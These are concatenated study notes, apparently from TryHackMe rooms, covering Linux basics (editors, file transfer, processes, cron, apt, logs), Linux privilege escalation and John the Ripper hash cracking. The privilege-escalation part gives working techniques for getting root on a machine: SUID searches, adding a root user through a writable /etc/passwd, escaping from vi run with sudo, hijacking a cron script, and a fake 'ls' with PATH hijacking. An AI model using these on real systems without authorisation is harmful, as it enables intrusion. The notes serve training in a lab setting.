<p>What's useful for us in pentesting is that any user can write to this folder by default. Meaning once we have access to a machine, it serves as a good place to store things like our enumeration scripts.</p>
<p>Some notable contents of the /tmp directory
root@linux2:/tmp# ls
todelete trash.txt rubbish.bin</p>
<p>Nice work! This room was quite theory-heavy and covered quite a range of the fundamentals in getting you familiar with Linux. To quickly recap, this room taught you:</p>
<p>How to connect to a Linux machine remotely using SSH
Advancing your use of commands by providing flags, switches and where you can go to learn about these for each command (man pages)
Some more commands that you'll frequently be using to interact with the filesystem and its contents
A brief introduction to file permissions &amp; switching users
A summary paragraph of the important root directories on a Ubuntu Linux install and how we may be able to use the data stored within these.
I encourage you to go through this room again once or twice to gain some familiarity with the concepts. After all, practice makes perfect! </p>
<p>Welcome to part three (and the finale) of the Linux Fundamentals module. So far, throughout the series, you have got hands-on with some fundamental concepts and used some important commands. This room is going to showcase some useful utilities and applications that you are likely to use day-to-day. You're also going to advance your Linux-fu skills by learning about automation, package management, and service/application logging. </p>
<p>Throughout the series so far, we have only stored text in files using a combination of the echo command and the pipe operators (&gt; and &gt;&gt;). This isn't an efficient way to handle data when you're working with files with multiple lines and the sorts!</p>
<p>Introducing terminal text editors</p>
<p>There are a few options that you can use, all with a variety of friendliness and utility. This task is going to introduce you to nano but also show you an alternative named VIM (which TryHackMe has a room dedicated to!)</p>
<p>Nano</p>
<p>It is easy to get started with Nano! To create or edit a file using nano, we simply use nano filename -- replacing &quot;filename&quot; with the name of the file you wish to edit.</p>
<p>Introducing Nano
tryhackme@linux3:/tmp# nano myfile
GNU nano 4.8                                             myfile</p>
<p>^G Get Help    ^O Write Out   ^W Where Is    ^K Cut Text    ^J Justify     ^C Cur Pos     M-U Undo       M-A Mark Text
^X Exit        ^R Read File   ^\ Replace     ^U Paste Text  ^T To Spell    ^_ Go To Line  M-E Redo       M-6 Copy Text
Once we press enter to execute the command, nano will launch! Where we can just begin to start entering or modifying our text. You can navigate each line using the &quot;up&quot; and &quot;down&quot; arrow keys or start a new line using the &quot;Enter&quot; key on your keyboard.</p>
<p>Using Nano to write text
tryhackme@linux3:/tmp# nano myfile
GNU nano 4.8                                             myfile                                             Modified</p>
<p>Hello TryHackMe
I can write things into &quot;myfile&quot;</p>
<p>^G Get Help    ^O Write Out   ^W Where Is    ^K Cut Text    ^J Justify     ^C Cur Pos     M-U Undo       M-A Mark Text
^X Exit        ^R Read File   ^\ Replace     ^U Paste Text  ^T To Spell    ^_ Go To Line  M-E Redo       M-6 Copy Text
Nano has a few features that are easy to remember &amp; covers the most general things you would want out of a text editor, including:</p>
<p>Searching for text
Copying and Pasting
Jumping to a line number
Finding out what line number you are on
You can use these features of nano by pressing the &quot;Ctrl&quot; key (which is represented as an ^ on Linux)  and a corresponding letter. For example, to exit, we would want to press &quot;Ctrl&quot; and &quot;X&quot; to exit Nano.</p>
<p>VIM</p>
<p>VIM is a much more advanced text editor. Whilst you're not expected to know all advanced features, it's helpful to mention it for powering up your Linux skills.</p>
<p>Some of VIM's benefits, albeit taking a much longer time to become familiar with, includes:</p>
<p>Customisable - you can modify the keyboard shortcuts to be of your choosing
Syntax Highlighting - this is useful if you are writing or maintaining code, making it a popular choice for software developers
VIM works on all terminals where nano may not be installed
There are a lot of resources such as cheatsheets, tutorials, and the sorts available to you use.
TryHackMe has a room showcasing VIM if you wish to learn more about this editor!</p>
<p>Downloading Files (Wget)</p>
<p>A pretty fundamental feature of computing is the ability to transfer files. For example, you may want to download a program, a script, or even a picture. Thankfully for us, there are multiple ways in which we can retrieve these files.</p>
<p>We're going to cover the use of wget .  This command allows us to download files from the web via HTTP -- as if you were accessing the file in your browser. We simply need to provide the address of the resource that we wish to download. For example, if I wanted to download a file named &quot;myfile.txt&quot; onto my machine, assuming I knew the web address it -- it would look something like this:</p>
<p>wget https://assets.tryhackme.com/additional/linux-fundamentals/part3/myfile.txt</p>
<p>Transferring Files From Your Host - SCP (SSH)</p>
<p>Secure copy, or SCP, is just that -- a means of securely copying files. Unlike the regular cp command, this command allows you to transfer files between two computers using the SSH protocol to provide both authentication and encryption.</p>
<p>Working on a model of SOURCE and DESTINATION, SCP allows you to:</p>
<p>Copy files &amp; directories from your current system to a remote system
Copy files &amp; directories from a remote system to your current system
Provided that we know usernames and passwords for a user on your current system and a user on the remote system. For example, let's copy an example file from our machine to a remote machine, which I have neatly laid out in the table below:</p>
<p>Variable	Value
The IP address of the remote system 	192.168.1.30
User on the remote system	ubuntu
Name of the file on the local system	important.txt
Name that we wish to store the file as on the remote system	transferred.txt
With this information, let's craft our scp command (remembering that the format of SCP is just SOURCE and DESTINATION)</p>
<p>scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt</p>
<p>And now let's reverse this and layout the syntax for using scp to copy a file from a remote computer that we're not logged into </p>
<p>Variable	Value
IP address of the remote system	192.168.1.30
User on the remote system	ubuntu
Name of the file on the remote system	documents.txt
Name that we wish to store the file as on our system	notes.txt
The command will now look like the following: scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt </p>
<p>Serving Files From Your Host - WEB</p>
<p>Ubuntu machines come pre-packaged with python3. Python helpfully provides a lightweight and easy-to-use module called &quot;HTTPServer&quot;. This module turns your computer into a quick and easy web server that you can use to serve your own files, where they can then be downloaded by another computing using commands such as curl and wget. </p>
<p>Python3's &quot;HTTPServer&quot; will serve the files in the directory where you run the command, but this can be changed by providing options that can be found within the manual pages. Simply, all we need to do is run python3 -m  http.server in the terminal to start the module! In the snippet below, we are serving from a directory called &quot;webserver&quot;, which has a single named &quot;file&quot;.</p>
<p>Using Python to start a web server
tryhackme@linux3:/webserver# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
Now, let's use wget to download the file using the MACHINE_IP address and the name of the file. Remember, because the python3 server is running port 8000, you will need to specify this within your wget command. For example:</p>
<p>An example wget command of a web server running on port 8000
tryhackme@mymachine:~# wget http://MACHINE_IP:8000/myfile
Note, you will need to open a new terminal to use wget and leave the one that you have started the Python3 web server in. This is because, once you start the Python3 web server, it will run in that terminal until you cancel it.</p>
<p>Let's take a look in the snippet below as an example:
Downloading a file from our webserver using wget
tryhackme@linux3:/tmp# wget http://MACHINE_IP:8000/file</p>
<p>2021-05-04 14:26:16  http://127.0.0.1:8000/file
Connecting to http://127.0.0.1:8000... connected.
HTTP request sent, awaiting response... 200 OK

<p>2021-05-04 14:26:16 (1.31 MB/s) - ‘file’ saved [51095/51095]
Remember, you will need to run the wget command in another terminal (while keeping the terminal that is running the Python3 server active). An example of this on the TryHackMe AttackBox is below:</p>
<p>One flaw with this module is that you have no way of indexing, so you must know the exact name and location of the file that you wish to use. This is why I prefer to use Updog. What's Updog? A more advanced yet lightweight webserver. But for now, let's stick to using Python's &quot;HTTP Server&quot;.</p>
<p>Processes are the programs that are running on your machine. They are managed by the kernel, where each process will have an ID associated with it, also known as its PID. The PID increments for the order In which the process starts. I.e. the 60th process will have a PID of 60.</p>
<p>Viewing Processes</p>
<p>We can use the friendly ps command to provide a list of the running processes as our user's session and some additional information such as its status code, the session that is running it, how much usage time of the CPU it is using, and the name of the actual program or command that is being executed:</p>
<p>Note how in the screenshot above, the second process ps has a PID of 204, and then in the command below it, this is then incremented to 205.</p>
<p>To see the processes run by other users and those that don't run from a session (i.e. system processes), we need to provide aux to the ps command like so: ps aux</p>
<p>Note we can see a total of 5 processes -- note how we now have &quot;root&quot;  and &quot;cmnatic&quot;</p>
<p>Another very useful command is the top command; top gives you real-time statistics about the processes running on your system instead of a one-time view. These statistics will refresh every 10 seconds, but will also refresh when you use the arrow keys to browse the various rows. Another great command to gain insight into your system is via the top command</p>
<p>Managing Processes</p>
<p>You can send signals that terminate processes; there are a variety of types of signals that correlate to exactly how &quot;cleanly&quot; the process is dealt with by the kernel. To kill a command, we can use the appropriately named kill command and the associated PID that we wish to kill. i.e., to kill PID 1337, we'd use kill 1337.</p>
<p>Below are some of the signals that we can send to a process when it is killed:</p>
<p>SIGTERM - Kill the process, but allow it to do some cleanup tasks beforehand
SIGKILL - Kill the process - doesn't do any cleanup after the fact
SIGSTOP - Stop/suspend a process</p>
<p>How do Processes Start?</p>
<p>Let's start off by talking about namespaces. The Operating System (OS) uses namespaces to ultimately split up the resources available on the computer to (such as CPU, RAM and priority) processes. Think of it as splitting your computer up into slices -- similar to a cake. Processes within that slice will have access to a certain amount of computing power, however, it will be a small portion of what is actually available to every process overall.</p>
<p>Namespaces are great for security as it is a way of isolating processes from another -- only those that are in the same namespace will be able to see each other.</p>
<p>We previously talked about how PID works, and this is where it comes into play. The process with an ID of 0 is a process that is started when the system boots. This process is the system's init on Ubuntu, such as systemd, which is used to provide a way of managing a user's processes and sits in between the operating system and the user. </p>
<p>For example, once a system boots and it initialises, systemd is one of the first processes that are started. Any program or piece of software that we want to start will start as what's known as a child process of systemd. This means that it is controlled by systemd, but will run as its own process (although sharing the resources from systemd) to make it easier for us to identify and the likes.</p>
<p>Getting Processes/Services to Start on Boot</p>
<p>Some applications can be started on the boot of the system that we own. For example, web servers, database servers or file transfer servers. This software is often critical and is often told to start during the boot-up of the system by administrators.</p>
<p>In this example, we're going to be telling the apache web server to be starting apache manually and then telling the system to launch apache2 on boot.</p>
<p>Enter the use of systemctl -- this command allows us to interact with the systemd process/daemon. Continuing on with our example, systemctl is an easy to use command that takes the following formatting: systemctl [option] [service]</p>
<p>For example, to tell apache to start up, we'll use systemctl start apache2. Seems simple enough, right? Same with if we wanted to stop apache, we'd just replace the [option] with stop (instead of start like we provided)</p>
<p>We can do four options with systemctl:</p>
<p>Start
Stop
Enable
Disable
An Introduction to Backgrounding and Foregrounding in Linux</p>
<p>Processes can run in two states: In the background and in the foreground. For example, commands that you run in your terminal such as &quot;echo&quot; or things of that sort will run in the foreground of your terminal as it is the only command provided that hasn't been told to run in the background. &quot;Echo&quot; is a great example as the output of echo will return to you in the foreground, but wouldn't in the background - take the screenshot below, for example.</p>
<p>Here we're running echo &quot;Hi THM&quot; , where we expect the output to be returned to us like it is at the start. But after adding the &amp; operator to the command, we're instead just given the ID of the echo process rather than the actual output -- as it is running in the background.</p>
<p>This is great for commands such as copying files because it means that we can run the command in the background and continue on with whatever further commands we wish to execute (without having to wait for the file copy to finish first)</p>
<p>We can do the exact same when executing things like scripts -- rather than relying on the &amp; operator, we can use Ctrl + Z on our keyboard to background a process. It is also an effective way of &quot;pausing&quot; the execution of a script or command like in the example below:</p>
<p>This script will keep on repeating &quot;This will keep on looping until I stop!&quot; until I stop or suspend the process. By using Ctrl + Z (as indicated by T^Z). Now our terminal is no longer filled up with messages -- until we foreground it, which we will discuss below.</p>
<p>Foregrounding a process</p>
<p>Now that we have a process running in the background, for example, our script &quot;background.sh&quot; which can be confirmed by using the ps aux command, we can back-pedal and bring this process back to the foreground to interact with.</p>
<p>With our process backgrounded using either Ctrl + Z or the &amp; operator, we can use fg to bring this back to focus like below, where we can see the fg command is being used to bring the background process back into use on the terminal, where the output of the script is now returned to us.</p>
<p>Users may want to schedule a certain action or task to take place after the system has booted. Take, for example, running commands, backing up files, or launching your favourite programs on, such as Spotify or Google Chrome.</p>
<p>We're going to be talking about the cron process, but more specifically, how we can interact with it via the use of crontabs . Crontab is one of the processes that is started during boot, which is responsible for facilitating and managing cron jobs.</p>
<p>A crontab is simply a special file with formatting that is recognised by the cron process to execute each line step-by-step. Crontabs require 6 specific values:</p>
<p>Value	Description
MIN	What minute to execute at
HOUR	What hour to execute at
DOM	What day of the month to execute at
MON	What month of the year to execute at
DOW	What day of the week to execute at
CMD	The actual command that will be executed.</p>
<p>Let's use the example of backing up files. You may wish to backup &quot;cmnatic&quot;'s  &quot;Documents&quot; every 12 hours. We would use the following formatting: </p>
<p>0 */12 * * * cp -R /home/cmnatic/Documents /var/backups/</p>
<p>An interesting feature of crontabs is that these also support the wildcard or asterisk (*). If we do not wish to provide a value for that specific field, i.e. we don't care what month, day, or year it is executed -- only that it is executed every 12 hours, we simply just place an asterisk.</p>
<p>This can be confusing to begin with, which is why there are some great resources such as the online &quot;Crontab Generator&quot; that allows you to use a friendly application to generate your formatting for you! As well as the site &quot;Cron Guru&quot;!</p>
<p>Crontabs can be edited by using crontab -e, where you can select an editor (such as Nano) to edit your crontab.</p>
<p>Introducing Packages &amp; Software Repos</p>
<p>When developers wish to submit software to the community, they will submit it to an  &quot;apt&quot; repository. If approved, their programs and tools will be released into the wild. Two of the most redeeming features of Linux shine to light here: User accessibility and the merit of open source tools.</p>
<p>When using the ls command on a Ubuntu 20.04 Linux machine, these files serve as the gateway/registry. </p>
<p>Whilst Operating System vendors will maintain their own repositories, you can also add community repositories to your list! This allows you to extend the capabilities of your OS. Additional repositories can be added by using the add-apt-repositorycommand or by listing another provider! For example, some vendors will have a repository that is closer to their geographical location.</p>
<p>Managing Your Repositories (Adding and Removing)</p>
<p>Normally we use the apt command to install software onto our Ubuntu system. The apt command is a part of the package management software also named apt. Apt contains a whole suite of tools that allows us to manage the packages and sources of our software, and to install or remove software at the same time.</p>
<p>One method of adding repositories is to use the add-apt-repository command we illustrated above, but we're going to walk through adding and removing a repository manually. Whilst you can install software through the use of package installers such as dpkg, the benefits of apt means that whenever we update our system -- the repository that contains the pieces of software that we add also gets checked for updates. </p>
<p>In this example, we're going to add the text editor Sublime Text to our Ubuntu machine as a repository as it is not a part of the default Ubuntu repositories. When adding software, the integrity of what we download is guaranteed by the use of what is called GPG (Gnu Privacy Guard) keys. These keys are essentially a safety check from the developers saying, &quot;here's our software&quot;. If the keys do not match up to what your system trusts and what the developers used, then the software will not be downloaded.</p>
<p>So, to start, we need to add the GPG key for the developers of Sublime Text 3. (Note that TryHackMe instances do not have internet access and so we're not expecting you to add this to the machine that you deploy, as it would fail.)</p>
<ol>
<li>
<p>Let's download the GPG key and use apt-key to trust it:  wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -</p>
</li>
<li>
<p>Now that we have added this key to our trusted list, we can now add Sublime Text 3's repository to our apt sources list. A good practice is to have a separate file for every different community/3rd party repository that we add.</p>
</li>
</ol>
<p>2.1. Let's create a file named sublime-text.list in /etc/apt/sources.list.d and enter the repository information like so:</p>
<p>2.2. And now use Nano or a text editor of your choice to add &amp; save the Sublime Text 3 repository into this newly created file:</p>
<p>2.3. After we have added this entry, we need to update apt to recognise this new entry -- this is done using the apt update command</p>
<p>2.4. Once successfully updated, we can now proceed to install the software that we have trusted and added to apt using apt install sublime-text</p>
<p>Removing packages is as easy as reversing. This process is done by using the add-apt-repository --remove ppa:PPA_Name/ppa command or by manually deleting the file that we previously added to. Once removed, we can just use apt remove [software-name-here] i.e. apt remove sublime-text</p>
<p>We briefly touched upon log files and where they can be found in Linux Fundamentals Part 1. However, let's quickly recap. Located in the /var/log directory, these files and folders contain logging information for applications and services running on your system. The Operating System  (OS) has become pretty good at automatically managing these logs in a process that is known as &quot;rotating&quot;.</p>
<p>I have highlighted some logs from three services running on a Ubuntu machine:</p>
<p>An Apache2 web server
Logs for the fail2ban service, which is used to monitor attempted brute forces, for example
The UFW service which is used as a firewall</p>
<p>These services and logs are a great way in monitoring the health of your system and protecting it. Not only that, but the logs for services such as a web server contain information about every single request - allowing developers or administrators to diagnose performance issues or investigate an intruder's activity. For example, the two types of log files below that are of interest:</p>
<p>access log
error log</p>
<p>There are, of course, logs that store information about how the OS is running itself and actions that are performed by users, such as authentication attempts.</p>
<p>Welcome to the end of the Linux Fundamentals module. Your familiarity with Linux will improve as you get to interact with it over time. Linux has the potential to do very powerful things with relative ease (as you have hopefully discovered throughout this module)</p>
<p>To recap, this room introduced you to the following topics:</p>
<p>Using terminal text editors
General utilities such as downloading and serving contents using a python webserver
A look into processes
Maintaining &amp; automating your system by the use of crontabs, package management, and reviewing logs

<p>Let's do it!</p>
<p>There are two main privilege escalation variants:</p>
<p>Horizontal privilege escalation: This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. For instance, a normal user hijacking another normal user (rather than elevating to super user). This allows you to inherit whatever files and access that user has. This can be used, for example, to gain access to another normal privilege user, that happens to have an SUID file attached to their home directory (more on these later) which can then be used to get super user access. [Travel sideways on the tree]</p>
<p>Vertical privilege escalation (privilege elevation): This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised. For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges. [Travel up on the tree]</p>

<p>Permission	On Files	On Directories
SUID Bit	User executes the file with permissions of the file owner	-
SGID Bit	User executes the file with the permission of the group owner.
File created in directory gets the same group owner.
Sticky Bit	No meaning	Users are prevented from deleting files from other users.</p>
<p>Finding and Exploiting SUID Files</p>
<p>The first step in Linux privilege escalation exploitation is to check for files with the SUID/GUID bit set. This means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!</p>
<p>What is an SUID binary?</p>
<p>As we all know in Linux everything is a file, including directories and devices which have permissions to allow or restrict three operations i.e. read/write/execute. So when you set permission for any file, you should be aware of the Linux users to whom you allow or restrict all three permissions. Take a look at the following demonstration of how maximum privileges (rwx-rwx-rwx) look:</p>
<p>r = read</p>
<p>w = write</p>
<p>x = execute</p>
<pre><code>user     group     others

rwx       rwx       rwx

421       421       421
</code></pre>
<p>The maximum number of bit that can be used to set permission for each user is 7, which is a combination of read (4) write (2) and execute (1) operation. For example, if you set permissions using &quot;chmod&quot; as 755, then it will be: rwxr-xr-x.</p>
<p>But when special permission is given to each user it becomes SUID or SGID. When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID) and when bit “2” is set to group it becomes SGID (Set Group ID).</p>
<p>Therefore, the permissions to look for when looking for SUID is:</p>
<p>SUID:</p>
<p>rws-rwx-rwx</p>
<p>GUID:</p>
<p>rwx-rws-rwx</p>
<p>Finding SUID Binaries</p>
<p>We already know that there is SUID capable files on the system, thanks to our LinEnum scan. However, if we want to do this manually we can use the command: &quot;find / -perm -u=s -type f 2&gt;/dev/null&quot; to search the file system for SUID/GUID files. Let's break down this command.</p>
<p>find - Initiates the &quot;find&quot; command</p>
<p>/ - Searches the whole file system</p>
<p>-perm - searches for files with specific permissions</p>
<p>-u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form</p>
<p>-type f - Only search for files</p>
<p>2&gt;/dev/null - Suppresses errors</p>

<p>Exploiting a writable /etc/passwd</p>
<p>Continuing with the enumeration of users, we found that user7 is a member of the root group with gid 0. And we already know from the LinEnum scan that /etc/passwd file is writable for the user. So from this observation, we concluded that user7 can edit the /etc/passwd file.</p>
<p>Understanding /etc/passwd</p>
<p>The /etc/passwd file stores essential information, which  is required during login. In other words, it stores user account information. The /etc/passwd is a plain text file. It contains a list of the system’s accounts, giving for each account some useful information like user ID, group ID, home directory, shell, and more.</p>
<p>The /etc/passwd file should have general read permission as many command utilities use it to map user IDs to user names. However, write access to the /etc/passwd must only limit for the superuser/root account. When it doesn't, or a user has erroneously been added to a write-allowed group. We have a vulnerability that can allow the creation of a root user that we can access.</p>
<p>Understanding /etc/passwd format</p>
<p>The /etc/passwd file contains one entry per line for each user (user account) of the system. All fields are separated by a colon : symbol. Total of seven fields as follows. Generally, /etc/passwd file entry looks as follows:</p>
<pre><code>test:x:0:0:root:/root:/bin/bash
</code></pre>
<p>[as divided by colon (:)]</p>
<p>Username: It is used when user logs in. It should be between 1 and 32 characters in length.
Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an &quot;x&quot;.
User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
Group ID (GID): The primary group ID (stored in /etc/group file)
User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
How to exploit a writable /etc/passwd</p>
<p>It's simple really, if we have a writable /etc/passwd file, we can write a new line entry according to the above formula and create a new user! We add the password hash of our choice, and set the UID, GID and shell to root. Allowing us to log in as our own root user!</p>

</code></pre>
<p>Sudo -l
This exploit comes down to how effective our user account enumeration has been. Every time you have access to an account during a CTF scenario, you should use &quot;sudo -l&quot; to list what commands you're able to use as a super user on that account. Sometimes, like this, you'll find that you're able to run certain commands as a root user without the root password. This can enable you to escalate privileges.</p>
<p>Escaping Vi</p>
<p>Running this command on the &quot;user8&quot; account shows us that this user can run vi with root privileges. This will allow us to escape vim in order to escalate privileges and get a shell as the root user!</p>
<p>Misconfigured Binaries and GTFOBins</p>
<p>If you find a misconfigured binary during your enumeration, or when you check what binaries a user account you have access to can access, a good place to look up how to exploit them is GTFOBins. GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. It provides a really useful breakdown of how to exploit a misconfigured binary and is the first place you should look if you find one on a CTF or Pentest.</p>

<p>What is Cron?</p>
<p>The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.</p>
<p>How to view what Cronjobs are active.</p>
<p>We can use the command &quot;cat /etc/crontab&quot; to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, or a similar script, doesn't find anything.</p>
<p>Format of a Cronjob</p>
<p>Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. </p>
<h1 id="-id"><a class="header" href="#-id">= ID</a></h1>
<p>m = Minute</p>
<p>h = Hour</p>
<p>dom = Day of the month</p>
<p>mon = Month</p>
<p>dow = Day of the week</p>
<p>user = What user the command will run as</p>
<p>command = What command should be run</p>
<p>For Example,</p>
<h1 id="m---h-dom-mon-dow-user--command"><a class="header" href="#m---h-dom-mon-dow-user--command">m   h dom mon dow user  command</a></h1>
<p>17 *   1  *   *   *  root  cd / &amp;&amp; run-parts --report /etc/cron.hourly</p>
<p>How can we exploit this?</p>
<p>We know from our LinEnum scan, that the file autoscript.sh, on user4's Desktop is scheduled to run every five minutes. It is owned by root, meaning that it will run with root privileges, despite the fact that we can write to this file. The task then is to create a command that will return a shell and paste it in this file. When the file runs again in five minutes the shell will be running as root.</p>
<p>What is PATH?</p>
<p>PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.</p>
<p>It is very simple to view the Path of the relevant user with help of the command &quot;echo $PATH&quot;.</p>
<p>How does this let us escalate privileges?</p>
<p>Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with &quot;ps&quot;. Unlike in our previous SUID example, in this situation we can't exploit it by supplying an argument for command injection, so what can we do to try and exploit this?</p>
<p>We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!</p>
<p>As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!</p>
<p>Now we're inside tmp, let's create an imitation executable. The format for what we want to do is:</p>
<p>echo &quot;[whatever command we want to run]&quot; &gt; [name of the executable we're imitating]</p>
<p>What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating</p>
<p>echo &quot;/bin/bash&quot; &gt; ls
chmod +x ls | chmod 4777 ls | chmod 777 ls</p>
<p>Now, we need to change the PATH variable, so that it points to the directory where we have our imitation &quot;ls&quot; stored! We do this using the command &quot;export PATH=/tmp:$PATH&quot;</p>
<p>Note, this will cause you to open a bash prompt every time you use &quot;ls&quot;. If you need to use &quot;ls&quot; before you finish the exploit, use &quot;/bin/ls&quot; where the real &quot;ls&quot; executable is.</p>
<p>Once you've finished the exploit, you can exit out of root and use &quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH&quot; to reset the PATH variable back to default, letting you use &quot;ls&quot; again!</p>

<p>Welcome
John the Ripper is one of the most well known, well-loved and versatile hash cracking tools out there. It combines a fast cracking speed, with an extraordinary range of compatible hash types. This room will assume no previous knowledge, so we must first cover some basic terms and concepts before we move into practical hash cracking.</p>
<p>What are Hashes?
A hash is a way of taking a piece of data of any length and  representing it in another form that is a fixed length. This masks the original value of the data. This is done by running the original data through a hashing algorithm. There are many popular hashing algorithms, such as MD4,MD5, SHA1 and NTLM. Lets try and show this with an example:</p>
<p>If we take &quot;polo&quot;, a string of 4 characters- and run it through an MD5 hashing algorithm, we end up with an output of: b53759f3ce692de7aff1b5779d3964da a standard 32 character MD5 hash.</p>
<p>Likewise, if we take &quot;polomints&quot;, a string of 9 characters- and run it through the same MD5 hashing algorithm, we end up with an output of: 584b6e4f4586e136bc280f27f9c64f3b another standard 32 character MD5 hash.</p>
<p>What makes Hashes secure?
Hashing functions are designed as one-way functions. In other words, it is easy to calculate the hash value of a given input; however, it is a difficult problem to find the original input given the hash value. By &quot;difficult&quot;, we mean that it is computationally infeasible. This has its roots in mathematics and P vs NP.</p>
<p>In computer science, P and NP are two classes of problems that help us understand the efficiency of algorithms:</p>
<p>P (Polynomial Time): Class P covers the problems whose solution can be found in polynomial time. Consider sorting a list in increasing order. The longer the list, the longer it would take to sort; nonetheless, the increase in time is not exponential.
NP (Non-deterministic Polynomial Time): Problems in the class NP are those for which a given solution can be checked quickly, even though finding the solution itself might be hard. In fact, we don't know if there is a fast algorithm to find the solution in the first place.
While this is an extremely interesting mathematical concept that proves fundamental to computing and cryptography, it is completely outside the scope of this room. But abstractly it means that the algorithm to hash the value will be &quot;P&quot; and can therefore be calculated reasonably. However an un-hashing algorithm would be &quot;NP&quot; and intractable to solve- meaning that it cannot be computed in a reasonable time using standard computers.</p>
<p>Where John Comes in...
Even though the algorithm itself is not feasibly reversible. That doesn't mean that cracking the hashes is impossible. If you have the hashed version of a password, for example- and you know the hashing algorithm- you can use that hashing algorithm to hash a large number of words, called a dictionary. You can then compare these hashes to the one you're trying to crack, to see if any of them match. If they do, you now know what word corresponds to that hash- you've cracked it!</p>
<p>This process is called a dictionary attack and John the Ripper, or John as it's commonly shortened to, is a tool to allow you to conduct fast brute force attacks on a large array of different hash types.</p>
<p>Learning More
For some more in-depth material on specific hashing and Encryption methods I'd recommend checking out NinjaJc01's amazing room covering these topics: encryptioncrypto101</p>
<p>Setting Up John The Ripper
John the Ripper is supported on many different Operating Systems, not just Linux Distributions. As a note before we go through this, there are multiple versions of John, the standard &quot;core&quot; distribution, as well as multiple community editions- which extend the feature set of the original John distribution. The most popular of these distributions is the &quot;Jumbo John&quot;- which we will be using specific features of later.</p>
<p>Parrot, Kali and AttackBox
If you're using Parrot OS, Kali Linux or TryHackMe's own AttackBox- you should already have Jumbo John installed. You can double check this by typing john into the terminal. You should be met with a usage guide for john, with the first line reading: &quot;John the Ripper 1.9.0-jumbo-1&quot; or similar with a different version number. If not, you can use sudo apt install john to install it.</p>
<p>Blackarch
If you're using Blackarch, or the Blackarch repositories you may or may not have Jumbo John installed, to check if you do, use the command pacman -Qe | grep &quot;john&quot; You should be met with an output similar to &quot;john 1.9.0.jumbo1-5&quot; or similar with a different version number. If you do not have it installed, you can simply use pacman -S john to install it.</p>
<p>Building from Source for Linux
If you wish to build the package from source to meet your system requirements, you can do this in five fairly straightforward steps. Further advice on the installation process and how to configure your build from source can be found here.</p>
<p>Use git clone https://github.com/openwall/john -b bleeding-jumbo john to clone the jumbo john repository to your current working
Then cd john/src/ to change your current directory to where the source code is. 
Once you're in this directory, use ./configure to check the required dependencies and options that have been configured.
If you're happy with this output, and have installed any required dependencies that are needed, use make -s clean &amp;&amp; make -sj4 to build a binary of john. This binary will be in the above run directory, which you can change to with cd ../run
You can test this binary using ./john --test</p>
<p>Installing on Windows
To install Jumbo John the Ripper on Windows, you just need to download and install the zipped binary for either 64 bit systems here or for 32 bit systems here.</p>
<p>Wordlists
As we explained in the first task, in order to dictionary attack hashes, you need a list of words that you can hash and compare, unsurprisingly this is called a wordlist. There are many different wordlists out there, a good collection to use can be found in the SecLists repository. There are a few places you can look for wordlists on your attacking system of choice, we will quickly run through where you can find them.</p>
<p>Parrot, Kali and AttackBox
On Parrot, Kali and TryHackMe's AttackBox- you can find a series of amazing wordlists in the /usr/share/wordlists directory.</p>
<p>RockYou
For all of the tasks in this room, we will be using the infamous rockyou.txt wordlist- which is a very large common password wordlist, obtained from a data breach on a website called rockyou.com in 2009. If you are not using any of the above distributions, you can get the rockyou.txt wordlist from the SecLists repository under the /Passwords/Leaked-Databases subsection. You may need to extract it from .tar.gz format, using tar xvzf rockyou.txt.tar.gz.</p>
<p>Now that we have our hash cracker and wordlists all set up, lets move onto some hash cracking!</p>
<p>Cracking Basic Hashes
There are multiple ways to use John the Ripper to crack simple hashes, we're going to walk through a few, before moving on to cracking some ourselves.</p>
<p>John Basic Syntax
The basic syntax of John the Ripper commands is as follows. We will cover the specific options and modifiers used as we use them.</p>
<p>john [options] [path to file]</p>
<p>john - Invokes the John the Ripper program</p>
<p>[path to file] - The file containing the hash you're trying to crack, if it's in the same directory you won't need to name a path, just the file.</p>
<p>Automatic Cracking
John has built-in features to detect what type of hash it's being given, and to select appropriate rules and formats to crack it for you, this isn't always the best idea as it can be unreliable- but if you can't identify what hash type you're working with and just want to try cracking it, it can be a good option! To do this we use the following syntax:</p>
<p>john --wordlist=[path to wordlist] [path to file]</p>
<p>--wordlist= - Specifies using wordlist mode, reading from the file that you supply in the following path...</p>
<p>[path to wordlist] - The path to the wordlist you're using, as described in the previous task.</p>
<p>Example Usage:</p>
<p>john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt</p>
<p>Identifying Hashes
